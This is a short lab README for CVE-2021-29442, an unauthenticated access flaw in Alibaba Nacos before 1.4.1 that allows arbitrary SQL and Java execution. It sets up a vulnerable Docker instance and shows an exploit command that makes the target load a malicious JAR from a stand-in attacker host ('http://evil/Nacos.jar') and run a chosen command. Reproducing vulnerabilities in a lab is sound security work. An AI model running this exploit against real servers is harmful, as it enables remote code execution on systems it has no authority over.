# Alibaba Nacos Authentication Bypass and Remote Code Execution (CVE-2021-29442)

[中文版本(Chinese version)](README.zh-cn.md)

Nacos is an easy-to-use platform designed for dynamic service discovery and configuration and service management.

In the Nacos version before 1.4.1, some API endpoints such as `/nacos/v1/cs/ops/derby` are not protected and can be openly accessed by unauthenticated users. Attackers are able to execute arbitrary SQL statement and Java code.

References:

- <https://github.com/advisories/GHSA-xv5h-v7jh-p2qh>
- <https://github.com/alibaba/nacos/issues/4463>
- <http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce>

## Vulnerable environment

Execute following command to start a Alibaba Nacos 1.4.0:

```
docker compose up -d
```

After server is started, brwose the `http://your-ip:8848/nacos/` you will see the default login page of Nacos.

## Exploit

First, upload malicious JAR [evil.jar](evil.jar) to a HTTP server, for example `http://evil/Nacos.jar`.

Then, execute [POC](poc.py) to exploit the issue:

```
python poc.py -t http://your-ip:8848 -s http://evil/Nacos.jar -c "ps aux"
```

The `-t` parameter specifies the target address, the `-s` parameter specifies the address of the malicious JAR package, and the `-c` parameter specifies the command to be executed.

As you can see, `ps aux` is executed successfully:

![](1.png)
